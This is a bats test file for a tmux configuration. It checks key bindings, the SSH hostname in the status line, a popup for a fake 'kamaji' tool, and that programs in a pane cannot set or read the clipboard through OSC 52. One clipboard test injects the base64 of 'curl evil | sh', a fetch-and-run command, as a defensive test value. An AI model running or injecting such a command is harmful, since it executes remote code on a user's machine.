#!/usr/bin/env bats
#
# env/.tmux.conf, loaded into a real tmux server. The server has a private
# socket in the test's own directory, so it can never reach the operator's
# tmux. A test that presses keys attaches a client under script(1), which
# gives it a terminal.

load helpers

setup() {
  # The real tmux, found before common_setup puts the fake one first on PATH.
  real_tmux="$(command -v tmux)" || skip "tmux is not installed"
  # A full path, because some tests give the server a PATH without tail.
  idle_cmd="$(command -v tail) -f /dev/null"
  common_setup
  unset TMUX
  export TMUX_TMPDIR="$BATS_TEST_TMPDIR/tmux"
  mkdir -p "$TMUX_TMPDIR"
  conf="$repo_root/env/.tmux.conf"
  client_pid=""
}

teardown() {
  t kill-server 2>/dev/null || true
  [[ -n "$client_pid" ]] && wait "$client_pid" 2>/dev/null || true
}

t() { "$real_tmux" -L conf "$@"; }

# start_server starts the server with env/.tmux.conf. Arguments go to env(1),
# as extra environment for the server. The pane runs a command that ignores
# its input, so that the end of the client's input (a Ctrl-D) cannot end the
# session. The server must not hold bats' file descriptor 3, or bats waits for
# it. The config's hooks run tmux, so the server's PATH ($server_path) has no
# fakes.
start_server() {
  local path="${server_path:-${PATH#"$repo_root/tests/fakes/bin:"}}"
  env "$@" PATH="$path" "$real_tmux" -L conf -f "$conf" \
    new-session -d -s main -x 120 -y 30 "$idle_cmd" 3>&-
}

# attach_client attaches a client under script(1), and waits for it.
# Arguments go to env(1), as extra environment for the client.
attach_client() {
  command -v script >/dev/null 2>&1 || skip "script(1) is not installed"
  env "$@" script -qec "$real_tmux -L conf attach -t main" /dev/null >/dev/null 2>&1 3>&- &
  client_pid=$!
  for _ in $(seq 50); do
    client="$(t list-clients -F '#{client_name}' 2>/dev/null | head -1)"
    [[ -n "$client" ]] && return 0
    sleep 0.1
  done
  echo "no client attached" >&2
  return 1
}

# press sends one key to the client, as if it were typed.
press() {
  t send-keys -K -c "$client" "$1"
  sleep 0.2
}

key_table() { t display-message -p -c "$client" '#{client_key_table}'; }

status_left() { t display-message -p -c "$client" '#{T:status-left}'; }

ssh_connection="192.0.2.1 50000 192.0.2.2 22"

@test "the prefix is C-a, and C-a C-a sends the prefix" {
  start_server
  [ "$(t show -gv prefix)" = "C-a" ]
  run t list-keys -T prefix C-a
  [[ "$output" == *"send-prefix"* ]]
}

@test "a program in a pane cannot set the clipboard through OSC 52" {
  start_server
  # A program in a pane, such as a sandbox agent, sends OSC 52.
  t new-window -d "printf '\\033]52;c;%s\\a' \"\$(printf 'curl evil | sh' | base64)\"; sleep 5"
  sleep 0.5
  run t list-buffers
  [ -z "$output" ]
}

@test "a program in a pane cannot read the paste buffer through OSC 52" {
  start_server
  t set-buffer "a secret that the operator copied"
  # The pane asks for the clipboard, and writes any answer to a file.
  t new-window -d "bash -c 'stty raw -echo; printf \"\\033]52;c;?\\a\"; \\
    IFS= read -r -t 2 -d \$(printf \"\\a\") r; printf %s \"\$r\" >\"$BATS_TEST_TMPDIR/answer\"'"
  sleep 3
  [ ! -s "$BATS_TEST_TMPDIR/answer" ]
}

@test "a copy sends OSC 52 for the clipboard c, the only form that mosh passes on" {
  command -v script >/dev/null 2>&1 || skip "script(1) is not installed"
  start_server
  TERM=xterm-256color script -qfec "$real_tmux -L conf attach -t main" \
    "$BATS_TEST_TMPDIR/terminal" >/dev/null 2>&1 3>&- &
  client_pid=$!
  for _ in $(seq 50); do
    [[ -n "$(t list-clients 2>/dev/null)" ]] && break
    sleep 0.1
  done
  t set-buffer -w hello
  sleep 0.5
  grep -aq $'\e]52;c;'"$(printf hello | base64)" "$BATS_TEST_TMPDIR/terminal"
}

@test "with no clipboard command installed, y in copy mode still copies" {
  # Only the tools that the config could look for, and none of them.
  mkdir -p "$BATS_TEST_TMPDIR/bin"
  server_path="$BATS_TEST_TMPDIR/bin" start_server
  [ -z "$(t show -sv copy-command)" ]
  run t list-keys -T copy-mode-vi y
  [[ "$output" == *"copy-pipe-and-cancel"* ]]
}

@test "with wl-copy installed, y in copy mode pipes to it" {
  mkdir -p "$BATS_TEST_TMPDIR/bin"
  printf '#!/bin/sh\ncat >/dev/null\n' >"$BATS_TEST_TMPDIR/bin/wl-copy"
  chmod +x "$BATS_TEST_TMPDIR/bin/wl-copy"
  server_path="$BATS_TEST_TMPDIR/bin" start_server
  [ "$(t show -sv copy-command)" = "wl-copy" ]
}

@test "F12 turns the prefix off and shows OFF, and F12 again turns it back on" {
  start_server
  attach_client

  press F12
  [ "$(key_table)" = "off" ]
  [ "$(t show -v prefix)" = "None" ]
  [[ "$(status_left)" == *"OFF"* ]]

  # C-a in the off table does nothing here, so the next F12 still toggles.
  press C-a
  [ "$(key_table)" = "off" ]

  press F12
  [ "$(key_table)" = "root" ]
  [ "$(t show -gv prefix)" = "C-a" ]
  run t show -v prefix
  [ -z "$output" ]
  [[ "$(status_left)" != *"OFF"* ]]
}

@test "a client over SSH sees the hostname, even when the server started locally" {
  start_server -u SSH_CONNECTION
  attach_client SSH_CONNECTION="$ssh_connection"
  host="$(t display-message -p '#h')"
  [[ "$(status_left)" == *"$host"* ]]
  [[ "$(status_left)" == *"main"* ]]
}

@test "a server started over SSH shows the hostname" {
  start_server SSH_CONNECTION="$ssh_connection"
  host="$(t display-message -p '#h')"
  [[ "$(t display-message -p -t main '#{T:status-left}')" == *"$host"* ]]
}

@test "a local client sees the session but not the hostname, even when the server started over SSH" {
  start_server SSH_CONNECTION="$ssh_connection"
  attach_client -u SSH_CONNECTION
  host="$(t display-message -p '#h')"
  [[ "$(status_left)" == *"main"* ]]
  [[ "$(status_left)" != *"$host"* ]]
}

# given_kamaji puts a fake kamaji on the server's PATH. It logs its arguments
# and exits with the status that it is given.
given_kamaji() {
  mkdir -p "$BATS_TEST_TMPDIR/bin"
  printf '#!/bin/sh\necho "$*" >>"%s/kamaji.log"\nexit %s\n' "$FAKE_STATE" "$1" >"$BATS_TEST_TMPDIR/bin/kamaji"
  chmod +x "$BATS_TEST_TMPDIR/bin/kamaji"
  server_path="$BATS_TEST_TMPDIR/bin:${PATH#"$repo_root/tests/fakes/bin:"}"
}

# open_board presses C-a b, and waits until kamaji has run. The client-attached
# hook runs a shell, and a key pressed before it finishes is lost, so C-a is
# pressed until the client is in the prefix table.
open_board() {
  start_server
  attach_client
  for _ in $(seq 10); do
    press C-a
    [ "$(key_table)" = "prefix" ] && break
  done
  press b
  for _ in $(seq 20); do
    [[ -s "$FAKE_STATE/kamaji.log" ]] && break
    sleep 0.1
  done
  [ "$(cat "$FAKE_STATE/kamaji.log")" = "board" ]
  sleep 0.5
}

@test "C-a b opens kamaji board in a popup, which closes when the board exits" {
  given_kamaji 0
  open_board
  # With no popup, C-a reaches tmux again.
  press C-a
  [ "$(key_table)" = "prefix" ]
}

@test "C-a b keeps the popup open when kamaji board fails, until Enter closes it" {
  given_kamaji 1
  open_board
  # The open popup takes the keys, so C-a does not reach tmux.
  press C-a
  [ "$(key_table)" = "root" ]
  # Enter closes it.
  press Enter
  sleep 0.3
  press C-a
  [ "$(key_table)" = "prefix" ]
}
